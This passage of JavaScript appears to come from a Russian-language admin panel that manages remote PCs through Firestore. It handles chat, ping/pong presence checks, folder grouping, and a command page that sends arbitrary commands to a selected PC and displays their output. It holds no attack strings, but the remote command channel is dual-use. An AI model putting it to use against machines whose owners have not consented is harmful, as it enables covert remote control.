      <div class="msgRow ${isMe ? "me" : ""}">
        <div class="bubble">
          <div class="bubbleTop">
            <span class="sender">${escapeHtml(sender)}</span>
            <span>${escapeHtml(time)}</span>
          </div>
          <div class="text">${escapeHtml(m.text || "")}</div>
        </div>
      </div>`;
    }).join("");
}

async function trimMessagesAsync(clientId) {
    if (trimLock) return;
    trimLock = true;
    try {
        const chatRef = collection(db, "pcList", clientId, "chatMessages");
        const snap = await getDocs(query(chatRef, orderBy("ts", "asc")));
        if (snap.size <= MAX_MESSAGES) return;
        const toDelete = snap.size - MAX_MESSAGES;
        let i = 0;
        for (const d of snap.docs) {
            if (i >= toDelete) break;
            await deleteDoc(d.ref);
            i++;
        }
    } finally {
        trimLock = false;
    }
}

async function sendMessage() {
    if (!selectedClientId || !chatIsOpen) return;
    const text = (msgInput?.value || "").trim();
    if (!text) return;
    if (msgInput) msgInput.value = "";
    msgInput?.focus();
    const chatRef = collection(db, "pcList", selectedClientId, "chatMessages");
    await addDoc(chatRef, {
        sender: ADMIN_NAME,
        senderRole: "admin",
        text,
        ts: serverTimestamp()
    });
    await trimMessagesAsync(selectedClientId);
}

btnSend?.addEventListener("click", sendMessage);
msgInput?.addEventListener("keydown", (e) => { if (e.key === "Enter") sendMessage(); });

// ---------- PING / PONG ----------
function setPingBadge(text, cls) {
    if (!pingStatus) return;
    pingStatus.textContent = text;
    pingStatus.className = `badge ${cls || ""}`;
}
function setPingAllBadge(text, cls) {
    if (!pingAllStatus) return;
    pingAllStatus.textContent = text;
    pingAllStatus.className = `badge ${cls || ""}`;
}

function waitForPong(clientId, token, timeoutMs = PING_TIMEOUT_MS) {
    return new Promise((resolve) => {
        const ref = doc(db, "pcList", clientId);
        const t0 = Date.now();
        const unsub = onSnapshot(ref, (snap) => {
            const d = snap.data() || {};
            const online = d.online || {};
            const pong = online.pong;
            if (pong && pong === token) {
                try { unsub(); } catch { }
                resolve({ ok: true });
            } else if (Date.now() - t0 > timeoutMs) {
                try { unsub(); } catch { }
                resolve({ ok: false });
            }
        }, () => resolve({ ok: false }));
        setTimeout(() => { try { unsub(); } catch { } resolve({ ok: false }); }, timeoutMs + 250);
    });
}

async function setPcOnlineFlag(clientId, isOnline) {
    const ref = doc(db, "pcList", clientId);
    if (isOnline) {
        await updateDoc(ref, {
            "online.pcOnline": 1,
            "online.lastOnlineAt": serverTimestamp(),
            "online.startTime": nowLocalString()
        });
    } else {
        await updateDoc(ref, {
            "online.pcOnline": 0,
            "online.lastOfflineAt": serverTimestamp(),
            "online.stopTime": nowLocalString()
        });
    }
}

async function doPing() {
    if (!selectedClientId) return;
    const token = randToken();
    setPingBadge("ping…", "wait");
    const ref = doc(db, "pcList", selectedClientId);
    await updateDoc(ref, { "online.ping": token, "online.pingAt": serverTimestamp() });
    const res = await waitForPong(selectedClientId, token, PING_TIMEOUT_MS);
    if (res.ok) {
        setPingBadge("pong ✅ ONLINE", "good");
        await setPcOnlineFlag(selectedClientId, true);
    } else {
        setPingBadge("нет pong ❌ OFFLINE", "bad2");
        await setPcOnlineFlag(selectedClientId, false);
    }
}

btnPing?.addEventListener("click", () => {
    doPing().catch((e) => { setPingBadge("ошибка ping", "bad2"); alert("Ping error: " + (e?.message || e)); });
});

async function pingOnePcSilent(clientId) {
    const token = randToken();
    const ref = doc(db, "pcList", clientId);
    await updateDoc(ref, { "online.ping": token, "online.pingAt": serverTimestamp() });
    const res = await waitForPong(clientId, token, PING_TIMEOUT_MS);
    await setPcOnlineFlag(clientId, res.ok);
    return res.ok;
}

async function pingAllClients() {
    const items = pcDocs.map(x => x.id);
    if (!items || items.length === 0) { setPingAllBadge("Нет элементов", "warn"); return; }
    setPingAllBadge(`Пингую ${items.length}...`, "wait");
    const tasks = items.map(async (id) => {
        try { return await pingOnePcSilent(id); }
        catch { try { await setPcOnlineFlag(id, false); } catch { } return false; }
    });
    const results = await Promise.all(tasks);
    const onlineCount = results.filter(Boolean).length;
    setPingAllBadge(`Онлайн: ${onlineCount} / ${items.length}`, onlineCount > 0 ? "good" : "bad2");
}

btnPingAll?.addEventListener("click", () => {
    pingAllClients().catch((e) => { setPingAllBadge("Ошибка при пинге", "bad2"); alert("PingAll error: " + (e?.message || e)); });
});

// ---------- COMMAND PAGE ----------
function renderCommandPage() {
    if (!selectedClientId) {
        if (cmdClientName) cmdClientName.textContent = "Не выбран";
        if (cmdOutput) cmdOutput.textContent = "Выберите клиента на странице 'PC List' для отправки команд";
        return;
    }
    const pcName = selectedClientData?.system?.pcName || selectedClientId;
    if (cmdClientName) cmdClientName.textContent = pcName;
}

function setCmdBadge(text, cls) {
    if (!cmdStatusBadge) return;
    cmdStatusBadge.textContent = text;
    cmdStatusBadge.className = `badge ${cls || ""}`;
}

function fmtCmdResult(d) {
    if (!d) return "Нет данных (документ command/current отсутствует).";
    const lines = [];
    lines.push(`status: ${d.status ?? "—"}`);
    lines.push(`id: ${d.id ?? "—"}`);
    lines.push(`cmd: ${d.cmd ?? "—"}`);
    lines.push(`worker: ${d.worker ?? "—"}`);
    lines.push(`exitCode: ${d.exitCode ?? "—"}`);
    const dt = tsToDate(d.ts);
    lines.push(`ts: ${dt ? fmtTime.format(dt) : (d.ts ? String(d.ts) : "—")}`);
    lines.push("");
    lines.push("stdout:");
    lines.push(d.stdout ? String(d.stdout) : "");
    lines.push("");
    lines.push("stderr:");
    lines.push(d.stderr ? String(d.stderr) : "");
    return lines.join("\n");
}

function startCommandRealtime(clientId) {
    cleanupCmdSubscription();
    const cmdRef = doc(db, "pcList", clientId, "command", "current");
    setCmdBadge("ожидание…", "wait");
    if (cmdOutput) cmdOutput.textContent = "Ждём данные от ПК…";

    unsubscribeCmd = onSnapshot(cmdRef, (snap) => {
        if (!snap.exists()) {
            setCmdBadge("нет данных", "warn");
            if (cmdOutput) cmdOutput.textContent = "Документ pcList/{id}/command/current не найден.";
            return;
        }
        const d = snap.data() || {};
        const status = String(d.status || "").toLowerCase();
        if (status === "done") setCmdBadge("done", "good");
        else if (status === "running") setCmdBadge("running", "wait");
        else if (status === "error") setCmdBadge("error", "bad2");
        else setCmdBadge(d.status || "—", "");
        if (cmdOutput) cmdOutput.textContent = fmtCmdResult(d);
        if (cmdBadge) {
            cmdBadge.textContent = status.toUpperCase();
            if (status === "done") cmdBadge.className = "badge good";
            else if (status === "running") cmdBadge.className = "badge wait";
            else if (status === "error") cmdBadge.className = "badge bad2";
            else cmdBadge.className = "badge";
        }
    }, (err) => {
        setCmdBadge("ошибка", "bad2");
        if (cmdOutput) cmdOutput.textContent = "Ошибка чтения command/current: " + (err?.message || err);
    });
}

async function sendCommand(clientId, cmdText) {
    const cmdRef = doc(db, "pcList", clientId, "command", "current");
    const id = randToken();
    await setDoc(cmdRef, {
        id, cmd: cmdText, status: "new",
        stdout: "", stderr: "", exitCode: 0,
        ts: serverTimestamp(), worker: ""
    }, { merge: true });
    return id;
}

btnCmdSend?.addEventListener("click", async () => {
    if (!selectedClientId) { alert("Сначала выберите клиента!"); return; }
    const text = (cmdInput?.value || "").trim();
    if (!text) { alert("Введите команду!"); return; }
    try {
        setCmdBadge("отправка…", "wait");
        await sendCommand(selectedClientId, text);
        if (cmdInput) cmdInput.value = "";
        setCmdBadge("отправлено", "wait");
        startCommandRealtime(selectedClientId);
    } catch (e) {
        setCmdBadge("ошибка", "bad2");
        alert("Command send error: " + (e?.message || e));
    }
});

cmdInput?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") { e.preventDefault(); btnCmdSend?.click(); }
});

cmdPreset?.addEventListener("change", () => {
    const v = (cmdPreset.value || "").trim();
    if (!v) return;
    if (cmdInput) {
        cmdInput.value = v;
        cmdInput.focus();
        cmdInput.setSelectionRange(cmdInput.value.length, cmdInput.value.length);
    }
    cmdPreset.value = "";
});

btnCmdClose?.addEventListener("click", () => {
    if (cmdOutput) cmdOutput.textContent = "Выберите клиента и отправьте команду...";
    setCmdBadge("—", "");
    if (cmdBadge) { cmdBadge.textContent = "—"; cmdBadge.className = "badge"; }
});

// ==========================================================
// ==================== FOLDERS (FoldSort) ==================
// ==========================================================

function startFoldersRealtime() {
    cleanupFoldersSubscription();

    unsubscribeFolders = onSnapshot(collection(db, "FoldSort"), (snap) => {
        const arr = [];
        snap.forEach((d) => arr.push({ id: d.id, ...d.data() }));
        // Sort by createdAt
        arr.sort((a, b) => {
            const at = tsToDate(a.createdAt) || new Date(0);
            const bt = tsToDate(b.createdAt) || new Date(0);
            return at - bt;
        });
        folderDocs = arr;

        // Update folder count badges
        if (foldersBadge) foldersBadge.textContent = folderDocs.length;
        if (foldersCountBadge) foldersCountBadge.textContent = `${folderDocs.length} папок`;

        renderFolderFilterBtns();
        if (currentPage === "folders") renderFolderPage();
    }, (err) => {
        console.error("FoldSort error:", err);
    });
}

// ---- Build folder tree ----
function buildFolderTree(parentId = null) {
    return folderDocs
        .filter(f => (f.parentId || null) === parentId)
        .map(f => ({ ...f, children: buildFolderTree(f.id) }));
}

function countClientsInFolder(folderId, includeChildren = true) {
    let count = pcDocs.filter(c => c.folderId === folderId).length;
    if (includeChildren) {
        const children = folderDocs.filter(f => f.parentId === folderId);
        children.forEach(child => { count += countClientsInFolder(child.id, true); });
    }
    return count;
}

// ---- Render folder tree ----
function renderFolderTreeHTML(nodes, depth = 0) {
    if (!nodes || nodes.length === 0) return "";
    return nodes.map(node => {
        const isCollapsed = collapsedFolders.has(node.id);
        const clientCount = countClientsInFolder(node.id, false);
        const totalCount = countClientsInFolder(node.id, true);
        const hasChildren = node.children && node.children.length > 0;
        const isActive = activeFolderPageId === node.id;

        return `
        <div class="folderNode" data-id="${escapeHtml(node.id)}" style="--depth:${depth}">
            <div class="folderNodeRow ${isActive ? 'active' : ''}"
                 data-id="${escapeHtml(node.id)}"
                 ondragover="event.preventDefault()"
                 ondrop="handleFolderDrop(event,'${escapeHtml(node.id)}')">
                <span class="folderToggle ${hasChildren ? '' : 'invisible'}" data-toggle="${escapeHtml(node.id)}">
                    <i class="fas fa-chevron-${isCollapsed ? 'right' : 'down'}"></i>
                </span>
                <i class="fas fa-folder${isActive ? '-open' : ''} folderIcon"></i>
                <span class="folderNodeName" data-select="${escapeHtml(node.id)}">${escapeHtml(node.name)}</span>
                <span class="badge folderCountBadge">${clientCount}${totalCount !== clientCount ? '/' + totalCount : ''}</span>
                <div class="folderActions">
                    <button class="folderActionBtn" title="Добавить подпапку" data-action="addChild" data-id="${escapeHtml(node.id)}"><i class="fas fa-folder-plus"></i></button>
                    <button class="folderActionBtn" title="Переименовать" data-action="rename" data-id="${escapeHtml(node.id)}"><i class="fas fa-pen"></i></button>
                    <button class="folderActionBtn danger" title="Удалить" data-action="delete" data-id="${escapeHtml(node.id)}"><i class="fas fa-trash"></i></button>
                </div>
            </div>
            ${hasChildren && !isCollapsed
                ? `<div class="folderChildren">${renderFolderTreeHTML(node.children, depth + 1)}</div>`
                : ''}
        </div>`;
    }).join("");
}

function renderFolderPage() {
    if (!folderTreeRoot) return;

    const tree = buildFolderTree(null);

    if (tree.length === 0) {
        folderTreeRoot.innerHTML = `<div class="hint">Нет папок. Нажмите «Создать папку»</div>`;
    } else {
        folderTreeRoot.innerHTML = renderFolderTreeHTML(tree);
        // Bind events
        folderTreeRoot.querySelectorAll(".folderToggle[data-toggle]").forEach(el => {
            el.addEventListener("click", (e) => {
                e.stopPropagation();
                const fid = el.getAttribute("data-toggle");
                if (collapsedFolders.has(fid)) collapsedFolders.delete(fid);
                else collapsedFolders.add(fid);
                renderFolderPage();
            });
        });

        folderTreeRoot.querySelectorAll(".folderNodeName[data-select]").forEach(el => {
            el.addEventListener("click", (e) => {
                e.stopPropagation();
                activeFolderPageId = el.getAttribute("data-select");
                renderFolderPage();
                renderFolderClients();
            });
        });

        folderTreeRoot.querySelectorAll(".folderActionBtn[data-action]").forEach(btn => {
            btn.addEventListener("click", async (e) => {
                e.stopPropagation();
                const action = btn.getAttribute("data-action");
                const fid = btn.getAttribute("data-id");
                if (action === "addChild") await handleFolderAddChild(fid);
                else if (action === "rename") await handleFolderRename(fid);
                else if (action === "delete") await handleFolderDelete(fid);
            });
        });
    }

    // Also render clients panel
    renderFolderClients();
}

function renderFolderClients() {
    if (!folderClientsList) return;

    if (!activeFolderPageId) {
        if (folderClientsTitle) folderClientsTitle.textContent = "Выберите папку для просмотра клиентов";
        if (folderClientsCount) folderClientsCount.textContent = "0";
        folderClientsList.innerHTML = `<div class="hint">Выберите папку</div>`;
        return;
    }

    const folder = folderDocs.find(f => f.id === activeFolderPageId);
    if (!folder) {
        activeFolderPageId = null;
        renderFolderClients();
        return;
    }

    const clients = pcDocs.filter(c => c.folderId === activeFolderPageId);

    if (folderClientsTitle) folderClientsTitle.textContent = `📁 ${folder.name}`;
    if (folderClientsCount) folderClientsCount.textContent = clients.length;

    if (clients.length === 0) {
        folderClientsList.innerHTML = `<div class="hint">Папка пуста. Перетащите клиентов сюда или используйте кнопку «Переместить»</div>`;
        return;
    }

    folderClientsList.innerHTML = clients.map(c => {
        const pcName = c.system?.pcName || c.id;
        const badge = onlineBadge(c.online?.pcOnline);
        return `
        <div class="clientItem" data-id="${escapeHtml(c.id)}">
            <div class="clientTop">
                <div class="clientName">${escapeHtml(pcName)}</div>
                <div class="clientTopRight">
                    <span class="badge ${badge.cls}">${badge.text}</span>
                    <button class="clientMoveBtn folderRemoveBtn" data-id="${escapeHtml(c.id)}" title="Убрать из папки">
                        <i class="fas fa-folder-minus"></i>
                    </button>
                </div>
            </div>
            <div class="clientMeta">${escapeHtml(c.system?.userName ? '@' + c.system.userName : '—')} • ${escapeHtml(c.system?.internetIp || '—')}</div>
        </div>`;
    }).join("");

    // Remove from folder buttons
    folderClientsList.querySelectorAll(".folderRemoveBtn").forEach(btn => {
        btn.addEventListener("click", async (e) => {
            e.stopPropagation();
            const id = btn.getAttribute("data-id");
            try {
                await updateDoc(doc(db, "pcList", id), { folderId: null, folderName: null });
            } catch (err) {
                alert("Ошибка: " + (err?.message || err));
            }
        });
    });

    // Select client on click
    folderClientsList.querySelectorAll(".clientItem").forEach(el => {
        el.addEventListener("click", (e) => {
            if (e.target.closest(".folderRemoveBtn")) return;
            selectClient(el.getAttribute("data-id"));
            switchPage("pcList");
        });
    });
}

// ---- Global drag handler for folders ----
window.handleFolderDrop = async function(event, folderId) {
    event.preventDefault();
    const clientId = event.dataTransfer.getData("text/plain") || dragClientId;
    if (!clientId) return;
    try {
        const folder = folderDocs.find(f => f.id === folderId);
        await updateDoc(doc(db, "pcList", clientId), {
            folderId,
            folderName: folder?.name || folderId
        });
    } catch (err) {
        alert("Ошибка перемещения: " + (err?.message || err));
    }
};

// ---- Folder CRUD ----
async function handleFolderAddChild(parentId) {
    const name = prompt("Название новой подпапки:");
    if (!name || !name.trim()) return;
    try {
        await addDoc(collection(db, "FoldSort"), {
            name: name.trim(),
            parentId,
            createdAt: serverTimestamp()
        });
    } catch (e) {
        alert("Ошибка создания папки: " + (e?.message || e));
    }
}

async function handleFolderRename(folderId) {
    const folder = folderDocs.find(f => f.id === folderId);
    const newName = prompt("Новое название папки:", folder?.name || "");
    if (!newName || !newName.trim()) return;
    try {
        await updateDoc(doc(db, "FoldSort", folderId), { name: newName.trim() });
        // Update folderName in all clients of this folder
        const clients = pcDocs.filter(c => c.folderId === folderId);
        await Promise.all(clients.map(c =>
            updateDoc(doc(db, "pcList", c.id), { folderName: newName.trim() })
        ));
    } catch (e) {
        alert("Ошибка переименования: " + (e?.message || e));
    }
}

async function handleFolderDelete(folderId) {
    const folder = folderDocs.find(f => f.id === folderId);
    const children = folderDocs.filter(f => f.parentId === folderId);
    const clientsInside = pcDocs.filter(c => c.folderId === folderId);

    let confirmMsg = `Удалить папку "${folder?.name}"?`;
    if (clientsInside.length > 0) {
        confirmMsg += `\n\n${clientsInside.length} клиентов будут перемещены в корень.`;
    }
    if (children.length > 0) {
        confirmMsg += `\n\nВнимание: ${children.length} подпапок также будут удалены.`;
    }

    if (!confirm(confirmMsg)) return;

    try {
        // Move clients to root
        await Promise.all(clientsInside.map(c =>
            updateDoc(doc(db, "pcList", c.id), { folderId: null, folderName: null })
        ));

        // Delete children recursively
        await deleteFolderRecursive(folderId);

        if (activeFolderPageId === folderId) {
            activeFolderPageId = null;
        }
    } catch (e) {
        alert("Ошибка удаления папки: " + (e?.message || e));
    }
}

async function deleteFolderRecursive(folderId) {
    const children = folderDocs.filter(f => f.parentId === folderId);
    for (const child of children) {
        // Move clients in children to root too
        const childClients = pcDocs.filter(c => c.folderId === child.id);
        await Promise.all(childClients.map(c =>
            updateDoc(doc(db, "pcList", c.id), { folderId: null, folderName: null })
        ));
        await deleteFolderRecursive(child.id);
    }
    await deleteDoc(doc(db, "FoldSort", folderId));
}

// Create root folder button
btnCreateRootFolder?.addEventListener("click", async () => {
    const name = prompt("Название новой папки:");
    if (!name || !name.trim()) return;
    try {
        const newDoc = await addDoc(collection(db, "FoldSort"), {
            name: name.trim(),
            parentId: null,
            createdAt: serverTimestamp()
        });
        activeFolderPageId = newDoc.id;
    } catch (e) {
        alert("Ошибка создания папки: " + (e?.message || e));
    }
});

// ---------- MOVE TO FOLDER MODAL ----------
let modalTargetIds = []; // client IDs to move

function openMoveFolderModal(clientIds) {
    if (folderDocs.length === 0) {
        alert("Сначала создайте папку в разделе «Folders»!");
        return;
    }
    modalTargetIds = clientIds;
    renderModalFolderList();
    moveFolderModal?.classList.remove("hidden");
}

function closeMoveFolderModal() {
    moveFolderModal?.classList.add("hidden");
    modalTargetIds = [];
}

function renderModalFolderList(parentId = null, depth = 0) {
    if (depth === 0 && modalFolderList) {
        modalFolderList.innerHTML = "";
    }

    const children = folderDocs.filter(f => (f.parentId || null) === parentId);
    children.forEach(folder => {
        const item = document.createElement("div");
        item.className = "modalFolderItem";
        item.style.paddingLeft = `${16 + depth * 20}px`;
        item.innerHTML = `<i class="fas fa-folder"></i> <span>${escapeHtml(folder.name)}</span>`;
        item.addEventListener("click", async () => {
            const idsToMove = [...modalTargetIds]; // сохраняем ДО закрытия
            closeMoveFolderModal();
            try {
                await Promise.all(idsToMove.map(id =>
                    updateDoc(doc(db, "pcList", id), {
                        folderId: folder.id,
                        folderName: folder.name
                    })
                ));
                if (isSelectMode) {
                    multiSelected.clear();
                    updateMultiSelectCount();
                }
            } catch (e) {
                alert("Ошибка перемещения: " + (e?.message || e));
            }
        });
        modalFolderList?.appendChild(item);
        renderModalFolderList(folder.id, depth + 1);
    });
}

modalClose?.addEventListener("click", closeMoveFolderModal);
modalCancel?.addEventListener("click", closeMoveFolderModal);
moveFolderModal?.addEventListener("click", (e) => {
    if (e.target === moveFolderModal) closeMoveFolderModal();
});

modalMoveToRoot?.addEventListener("click", async () => {
    const idsToMove = [...modalTargetIds]; // сохраняем ДО закрытия
    closeMoveFolderModal();
    try {
        await Promise.all(idsToMove.map(id =>
            updateDoc(doc(db, "pcList", id), { folderId: null, folderName: null })
        ));
        if (isSelectMode) {
            multiSelected.clear();
            updateMultiSelectCount();
        }
    } catch (e) {
        alert("Ошибка: " + (e?.message || e));
    }
});

// ---------- MISC ----------
window.addEventListener('resize', function () {
    if (selectedClientId) renderChatHeader();
});

let lastTouchEnd = 0;
document.addEventListener('touchend', function (event) {
    const now = (new Date()).getTime();
    if (now - lastTouchEnd <= 300) event.preventDefault();
    lastTouchEnd = now;
}, false);

document.addEventListener('DOMContentLoaded', function () {
    if (emailEl) emailEl.focus();
});

// ---------- SIDEBAR TOGGLE ----------
// Desktop sidebar collapse
sidebarToggle?.addEventListener("click", (e) => {
    e.stopPropagation();
    sidebar?.classList.toggle("collapsed");
    localStorage.setItem("sidebarCollapsed", sidebar?.classList.contains("collapsed"));
});

// Restore sidebar state on desktop
if (window.innerWidth > 768 && localStorage.getItem("sidebarCollapsed") === "true") {
    sidebar?.classList.add("collapsed");
}

// Mobile sidebar toggle
function toggleMobileSidebar() {
    appScreen?.classList.toggle("menu-open");
}

// Mobile menu button click
mobileMenuBtn?.addEventListener("click", (e) => {
    e.stopPropagation();
    toggleMobileSidebar();
});

// Close sidebar when clicking overlay on mobile
appScreen?.addEventListener("click", (e) => {
    if (window.innerWidth <= 768 && appScreen.classList.contains("menu-open")) {
        // Check if click is on overlay (not sidebar or menu button)
        if (!sidebar?.contains(e.target) && !mobileMenuBtn?.contains(e.target)) {
            toggleMobileSidebar();
        }
    }
});

// Prevent closing when clicking inside sidebar
sidebar?.addEventListener("click", (e) => {
    e.stopPropagation();
});
